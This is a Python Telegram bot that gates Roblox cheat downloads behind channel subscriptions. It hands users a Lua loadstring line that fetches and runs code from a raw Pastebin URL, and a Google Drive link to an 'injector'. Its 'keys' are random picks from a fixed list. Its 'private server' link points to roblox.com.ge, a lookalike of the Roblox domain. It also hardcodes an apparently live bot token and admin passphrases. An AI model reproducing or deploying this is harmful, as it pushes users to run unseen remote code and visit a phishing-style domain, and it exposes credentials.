import telebot
import random
from telebot import types
import sqlite3
import os
import socket
from threading import Thread
import uuid

TOKEN = os.environ.get("TOKEN", "8793302361:AAHCxbHJ6v_oCyjHqiafsHHaf7Xr1EvkDO8")
ADMIN_ID = 8091608667
ADMIN_SECRET = "larscriptkryyyyyyt"
ADMIN_SECRET2 = "кресло качалка"

DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_users.db")

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, lang TEXT DEFAULT 'ru')")
    c.execute("CREATE TABLE IF NOT EXISTS ref_links (id INTEGER PRIMARY KEY AUTOINCREMENT, link TEXT UNIQUE, message TEXT, created_by INTEGER)")
    conn.commit()
    conn.close()

def add_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    exists = c.fetchone()
    if not exists:
        c.execute("INSERT INTO users (user_id, lang) VALUES (?, 'ru')", (user_id,))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def set_lang(user_id, lang):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET lang = ? WHERE user_id = ?", (lang, user_id))
    conn.commit()
    conn.close()

def get_lang(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else 'ru'

def create_ref_link(admin_id, message):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    ref = str(uuid.uuid4())[:8]
    c.execute("INSERT INTO ref_links (link, message, created_by) VALUES (?, ?, ?)", (ref, message, admin_id))
    conn.commit()
    conn.close()
    return ref

def get_ref_message(ref):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT message FROM ref_links WHERE link = ?", (ref,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def get_all_ref_links():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, link, message FROM ref_links")
    links = c.fetchall()
    conn.close()
    return links

def delete_ref_link(link_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM ref_links WHERE id = ?", (link_id,))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = [row[0] for row in c.fetchall()]
    conn.close()
    return users

def count_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    count = c.fetchone()[0]
    conn.close()
    return count

init_db()

CHANNELS = [
    {"name": "freprivatka34", "url": "https://t.me/freprivatka34"},
    {"name": "freegodlymm2_67", "url": "https://t.me/freegodlymm2_67"},
    {"name": "keyscripts3", "url": "https://t.me/keyscripts3"}
]

KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR", "MALTUIPY"]
PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"
DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/view?usp=sharing"
BOT_USERNAME = "script8748389538954939_bot"

LANG = {
    "ru": {
        "lang_select": "Выберите язык / Choose language",
        "start": "😌 Чтобы продолжить пользоваться ботом, пожалуйста, выполни следующие задания!",
        "start_ref": "{message}\n\nПодпишись на каналы:",
        "check_sub_btn": "🔍 Проверить подписку",
        "check_again_btn": "🔍 Проверить снова",
        "sub_btn": "Подписаться ✅",
        "unsub_btn": "Подписаться ❎",
        "success_check": "✅ Подписка подтверждена!\n\nВыбери что хочешь получить:",
        "success_check_ref": "✅ Подписка подтверждена! Спасибо!",
        "not_all_subs": "❌ Осталось подписаться:",
        "script_btn": "📜 Скрипт на все игры",
        "key_btn": "🔑 Ключ",
        "private_btn": "🔒 Приватный сервер MM2",
        "delta_btn": "📥 Скачать инжектор (Delta)",
        "script_text": "📜 Скрипт на все игры:\n\n```lua\n{script}\n```",
        "key_text": "🔑 Твой ключ:\n\n`{key}`\n\nСкопируй и вставь в скрипт.",
        "private_text": "🔒 Приватный сервер MM2\n\n{link}",
        "not_subscribed": "📢 Подпишитесь на каналы для получения скрипта и ключа",
        "new_user": "🆕 Новый пользователь!\n\n🆔 ID: `{uid}`\n👤 Имя: {name}\n👥 Всего пользователей: {count}",
        "admin_panel": "🛡 *Админ панель*\n\n👥 Пользователей: {users}\n🔗 Реф. ссылок: {refs}\n\nВыбери действие:",
        "admin_stats": "📊 *Статистика:*\n👥 Всего пользователей: {users}\n🔗 Реф. ссылок: {refs}",
        "admin_users_list": "👥 *Пользователи ({count}):*\n\n{list}",
        "admin_no_users": "👥 Пользователей пока нет.",
        "admin_broadcast_prompt": "📨 Введи текст рассылки (получат {count} чел.):",
        "admin_broadcast_done": "✅ Рассылка завершена! Отправлено: {sent}/{total}",
        "admin_ref_create_prompt": "📝 Введи текст который увидят при переходе по ссылке:",
        "admin_ref_create": "✅ Ссылка создана:\n\n`{link}`\n\nТекст: {message}",
        "admin_ref_list": "🔗 *Реф. ссылки ({count}):*\n\n{list}",
        "admin_ref_delete": "✅ Ссылка удалена.",
        "admin_ref_create_btn": "➕ Создать реф. ссылку",
        "admin_ref_list_btn": "📋 Список реф. ссылок",
        "admin_ref_del_btn": "🗑 Удалить реф. ссылку",
        "admin_stats_btn": "📊 Статистика",
        "admin_users_btn": "👥 Пользователи",
        "admin_broadcast_btn": "📨 Рассылка",
    },
    "en": {
        "lang_select": "Choose language",
        "start": "😌 To continue, complete the tasks!",
        "start_ref": "{message}\n\nSubscribe to channels:",
        "check_sub_btn": "🔍 Check subscription",
        "check_again_btn": "🔍 Check again",
        "sub_btn": "Subscribe ✅",
        "unsub_btn": "Subscribe ❎",
        "success_check": "✅ Confirmed!\n\nChoose what to get:",
        "success_check_ref": "✅ Confirmed! Thanks!",
        "not_all_subs": "❌ Still need to subscribe:",
        "script_btn": "📜 Script",
        "key_btn": "🔑 Key",
        "private_btn": "🔒 Private server",
        "delta_btn": "📥 Download Delta",
        "script_text": "📜 Script:\n\n```lua\n{script}\n```",
        "key_text": "🔑 Key: `{key}`",
        "private_text": "🔒 MM2 Private:\n\n{link}",
        "not_subscribed": "📢 Subscribe to get script and key",
        "new_user": "🆕 New user!\n\n🆔 `{uid}`\n👤 {name}\n👥 Total: {count}",
        "admin_panel": "🛡 *Admin*\n\n👥 Users: {users}\n🔗 Ref links: {refs}",
        "admin_stats": "📊 *Stats:*\n👥 Users: {users}\n🔗 Ref links: {refs}",
        "admin_users_list": "👥 *Users ({count}):*\n\n{list}",
        "admin_no_users": "👥 No users.",
        "admin_broadcast_prompt": "📨 Broadcast text ({count} users):",
        "admin_broadcast_done": "✅ Sent: {sent}/{total}",
        "admin_ref_create_prompt": "📝 Enter text for the link:",
        "admin_ref_create": "✅ Link:\n\n`{link}`\n\nText: {message}",
        "admin_ref_list": "🔗 *Links ({count}):*\n\n{list}",
        "admin_ref_delete": "✅ Deleted.",
        "admin_ref_create_btn": "➕ Create link",
        "admin_ref_list_btn": "📋 Links",
        "admin_ref_del_btn": "🗑 Delete link",
        "admin_stats_btn": "📊 Stats",
        "admin_users_btn": "👥 Users",
        "admin_broadcast_btn": "📨 Broadcast",
    }
}

bot = telebot.TeleBot(TOKEN)

def t(user_id, key, **kwargs):
    lang = get_lang(user_id)
    text = LANG.get(lang, LANG["ru"]).get(key, key)
    return text.format(**kwargs) if kwargs else text

def notify_admin(text):
    try:
        bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
    except:
        pass

def is_admin(user_id):
    return user_id == ADMIN_ID

def get_unsubscribed_channels(user_id):
    not_subbed = []
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(f"@{ch['name']}", user_id)
            if member.status not in ["member", "administrator", "creator"]:
                not_subbed.append(ch)
        except:
            not_subbed.append(ch)
    return not_subbed

def get_lang_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"),
        types.InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
    )
    return keyboard

def get_channels_keyboard(user_id, is_ref=False):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        keyboard.add(types.InlineKeyboardButton(text=f"{t(user_id, 'sub_btn')} {ch['name']}", url=ch['url']))
    cb = "check_sub_ref" if is_ref else "check_sub"
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "check_sub_btn"), callback_data=cb))
    return keyboard

def get_unsub_keyboard(not_subbed, user_id, is_ref=False):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in not_subbed:
        keyboard.add(types.InlineKeyboardButton(text=f"{t(user_id, 'unsub_btn')} {ch['name']}", url=ch['url']))
    cb = "check_sub_ref" if is_ref else "check_sub"
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "check_again_btn"), callback_data=cb))
    return keyboard

def get_success_keyboard(user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "script_btn"), callback_data="get_script"))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "key_btn"), callback_data="get_key"))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "private_btn"), callback_data="get_private"))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "delta_btn"), url=DELTA_LINK))
    return keyboard

def get_admin_keyboard(user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(types.InlineKeyboardButton(t(user_id, "admin_stats_btn"), callback_data="admin_stats"))
    keyboard.add(types.InlineKeyboardButton(t(user_id, "admin_users_btn"), callback_data="admin_users_list"))
    keyboard.add(types.InlineKeyboardButton(t(user_id, "admin_broadcast_btn"), callback_data="admin_broadcast"))
    keyboard.add(types.InlineKeyboardButton(t(user_id, "admin_ref_create_btn"), callback_data="admin_ref_create"))
    keyboard.add(types.InlineKeyboardButton(t(user_id, "admin_ref_list_btn"), callback_data="admin_ref_list"))
    keyboard.add(types.InlineKeyboardButton(t(user_id, "admin_ref_del_btn"), callback_data="admin_ref_del"))
    return keyboard

@bot.message_handler(commands=["start"])
def start(message):
    args = message.text.split()
    is_ref = len(args) > 1 and args[1].startswith("ref_")
    
    add_user(message.from_user.id)
    
    if is_ref:
        ref_code = args[1].replace("ref_", "")
        ref_msg = get_ref_message(ref_code)
        msg = ref_msg if ref_msg else "🔗 Ты перешёл по реферальной ссылке!"
        text = t(message.from_user.id, "start_ref", message=msg)
        bot.send_message(message.chat.id, text, reply_markup=get_channels_keyboard(message.from_user.id, is_ref=True))
    else:
        bot.send_message(message.chat.id, LANG["ru"]["lang_select"], reply_markup=get_lang_keyboard())

@bot.callback_query_handler(func=lambda call: call.data.startswith("lang_"))
def lang_callback(call):
    lang = call.data.replace("lang_", "")
    set_lang(call.from_user.id, lang)
    user = call.from_user
    text = t(call.from_user.id, "new_user", uid=user.id, name=user.first_name, count=count_users())
    notify_admin(text)
    bot.send_message(call.message.chat.id, t(call.from_user.id, "start"), reply_markup=get_channels_keyboard(call.from_user.id))
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=["getkey"])
def getkey(message):
    add_user(message.from_user.id)
    not_subbed = get_unsubscribed_channels(message.from_user.id)
    if not not_subbed:
        key = random.choice(KEYS)
        bot.send_message(message.chat.id, t(message.from_user.id, "key_text", key=key), parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, t(message.from_user.id, "not_subscribed"), reply_markup=get_unsub_keyboard(not_subbed, message.from_user.id))

@bot.message_handler(func=lambda m: m.text == ADMIN_SECRET)
def admin_panel(message):
    if not is_admin(message.from_user.id):
        return
    refs = len(get_all_ref_links())
    text = t(message.from_user.id, "admin_panel", users=count_users(), refs=refs)
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=get_admin_keyboard(message.from_user.id))

@bot.message_handler(func=lambda m: m.text == ADMIN_SECRET2)
def broadcast_panel(message):
    if not is_admin(message.from_user.id):
        return
    msg = bot.send_message(message.chat.id, t(message.from_user.id, "admin_broadcast_prompt", count=count_users()))
    bot.register_next_step_handler(msg, broadcast_start)

def broadcast_start(message):
    users = get_all_users()
    text = message.text
    count = 0
    for uid in users:
        try:
            bot.send_message(uid, text)
            count += 1
        except:
            pass
    bot.send_message(message.chat.id, t(message.from_user.id, "admin_broadcast_done", sent=count, total=len(users)))

@bot.callback_query_handler(func=lambda call: True)
def user_callback(call):
    action = call.data
    user_id = call.from_user.id
    is_ref = action == "check_sub_ref"
    
    if action.startswith("lang_"):
        return
    
    if action in ["check_sub", "check_sub_ref"]:
        not_subbed = get_unsubscribed_channels(user_id)
        if not not_subbed:
            if is_ref:
                bot.send_message(call.message.chat.id, t(user_id, "success_check_ref"))
            else:
                bot.send_message(call.message.chat.id, t(user_id, "success_check"), reply_markup=get_success_keyboard(user_id))
        else:
            text = t(user_id, "not_all_subs") + "\n\n"
            for ch in not_subbed:
                text += f"❎ {ch['name']}\n"
            bot.send_message(call.message.chat.id, text, reply_markup=get_unsub_keyboard(not_subbed, user_id, is_ref))
    
    elif action == "get_script":
        bot.send_message(call.message.chat.id, t(user_id, "script_text", script=SCRIPT_LINK), parse_mode="Markdown")
        bot.answer_callback_query(call.id, "✅")
    
    elif action == "get_key":
        key = random.choice(KEYS)
        bot.send_message(call.message.chat.id, t(user_id, "key_text", key=key), parse_mode="Markdown")
        bot.answer_callback_query(call.id, "✅")
    
    elif action == "get_private":
        bot.send_message(call.message.chat.id, t(user_id, "private_text", link=PRIVATE_SERVER_LINK))
        bot.answer_callback_query(call.id, "✅")
    
    elif action == "admin_ref_create":
        if not is_admin(user_id):
            return
        msg = bot.send_message(call.message.chat.id, t(user_id, "admin_ref_create_prompt"))
        bot.register_next_step_handler(msg, create_ref_with_message)
        bot.answer_callback_query(call.id)
    
    elif action == "admin_ref_list":
        if not is_admin(user_id):
            return
        links = get_all_ref_links()
        if not links:
            bot.send_message(call.message.chat.id, "🔗 Нет реферальных ссылок.")
        else:
            text = "\n".join(f"• `{l[1]}` — {l[2][:30]}" for l in links)
            bot.send_message(call.message.chat.id, t(user_id, "admin_ref_list", count=len(links), list=text), parse_mode="Markdown")
        bot.answer_callback_query(call.id)
    
    elif action == "admin_ref_del":
        if not is_admin(user_id):
            return
        links = get_all_ref_links()
        if not links:
            bot.send_message(call.message.chat.id, "🔗 Нет реферальных ссылок.")
        else:
            keyboard = types.InlineKeyboardMarkup(row_width=1)
            for l in links:
                keyboard.add(types.InlineKeyboardButton(f"❌ {l[1]}", callback_data=f"admin_delref_{l[0]}"))
            bot.send_message(call.message.chat.id, "Выбери ссылку для удаления:", reply_markup=keyboard)
        bot.answer_callback_query(call.id)
    
    elif action.startswith("admin_delref_"):
        if not is_admin(user_id):
            return
        link_id = int(action.replace("admin_delref_", ""))
        delete_ref_link(link_id)
        bot.send_message(call.message.chat.id, t(user_id, "admin_ref_delete"))
        bot.answer_callback_query(call.id)
    
    elif action == "admin_stats":
        if not is_admin(user_id):
            return
        refs = len(get_all_ref_links())
        bot.send_message(call.message.chat.id, t(user_id, "admin_stats", users=count_users(), refs=refs), parse_mode="Markdown")
        bot.answer_callback_query(call.id)
    
    elif action == "admin_users_list":
        if not is_admin(user_id):
            return
        users = get_all_users()
        if not users:
            bot.send_message(call.message.chat.id, t(user_id, "admin_no_users"))
        else:
            text = "\n".join(f"• `{u}`" for u in users[:50])
            if len(users) > 50:
                text += f"\n... и ещё {len(users) - 50}"
            bot.send_message(call.message.chat.id, t(user_id, "admin_users_list", count=len(users), list=text), parse_mode="Markdown")
        bot.answer_callback_query(call.id)
    
    elif action == "admin_broadcast":
        if not is_admin(user_id):
            return
        msg = bot.send_message(call.message.chat.id, t(user_id, "admin_broadcast_prompt", count=count_users()))
        bot.register_next_step_handler(msg, broadcast_start)
        bot.answer_callback_query(call.id)
    
    else:
        bot.answer_callback_query(call.id)

def create_ref_with_message(message):
    user_id = message.from_user.id
    msg_text = message.text
    ref = create_ref_link(user_id, msg_text)
    link = f"https://t.me/{BOT_USERNAME}?start=ref_{ref}"
    bot.send_message(message.chat.id, t(user_id, "admin_ref_create", link=link, message=msg_text), parse_mode="Markdown")

def run_server():
    port = int(os.environ.get("PORT", 10000))
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f"Port {port} opened")
    while True:
        c, _ = s.accept()
        c.send(b"HTTP/1.1 200 OK\r\n\r\nBot running")
        c.close()

Thread(target=run_server).start()
bot.polling()
